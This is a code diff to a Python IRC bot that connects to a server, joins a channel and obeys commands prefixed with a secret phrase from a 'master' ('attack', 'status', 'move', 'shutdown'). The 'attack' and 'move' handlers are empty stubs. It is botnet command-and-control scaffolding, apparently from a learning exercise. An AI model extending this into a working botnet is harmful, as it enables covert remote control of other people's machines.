@@ -18,11 +18,11 @@ except Exception as err:
 
 def connect():
     while True:
-        botnum = str(random.randint(0,999999))
+        botname = "bot"+str(random.randint(0,999999))
         irc.connect((hostname, port))
-        msg = "NICK bot" + botnum + "\r\n"
+        msg = "NICK " + botname + "\r\n"
         irc.send(msg.encode())
-        msg = "USER bot * * : bot " + botnum +"\r\n"
+        msg = "USER "+botname+" * * : bot " + botname +"\r\n"
         irc.send(msg.encode())
         indata = irc.recv(1024)
         inmsg = indata.decode("utf-8").split("\r\n")
@@ -36,41 +36,60 @@ def connect():
                 break
     return
 
+# join channel
 def joinChannel(name):
-    # join channel
     msg = "JOIN #" +name+" \r\n"
     irc.send(msg.encode())
     indata = irc.recv(1024)
     inmsg = indata.decode("utf-8").split("\r\n")
-    for s in inmsg:
-        print(s)
     if inmsg[0].split()[1] == "JOIN":
         print("connected")
         return True
     return False
 #handles Ping msg
 def ping(pingmsg):
-    msg = "PONG "+pingmsg+"\r\n"
+    msg = "PONG "+pingmsg
     irc.send(msg.encode())
+    print ("PONG!")
     return
 
-
+#handles shutdown
+def shutdown():
+    irc.close()
+    sys.exit()
+    return
+#use to handle status command
+def status(masterName):
+    msg = "PRIVMSG "+masterName+" :Here\r\n"
+    irc.send(msg.encode())
+    return
 # use the listen to chat
 def listen():
     while True:
         indata = irc.recv(1024)
-        inmsg = indata.decode("utf-8").split()
+        inmsg = indata.decode("utf-8").split(":")
         print(inmsg)
-
-        if inmsg[0] == sphrase:
+        if 'PING' in inmsg[0]:
+            ping(inmsg[1])
+        elif sphrase == (inmsg[2].split())[0]:
             print ("serving master!")
+            if (inmsg[2].split())[1] == 'attack':
+                pass
+            elif (inmsg[2].split())[1] == 'status':
+                status(inmsg[1].split("!")[0])
+            elif (inmsg[2].split())[1] == 'move':
+                pass
+            elif (inmsg[2].split())[1] == 'shutdown':
+                shutdown()
         else:
-            pass
+            print("what to do?")
     return
 
 # main=========================================================================
 
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 irc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-connect()
-listen()
+botname = ""
+while True:
+    connect()
+    listen()
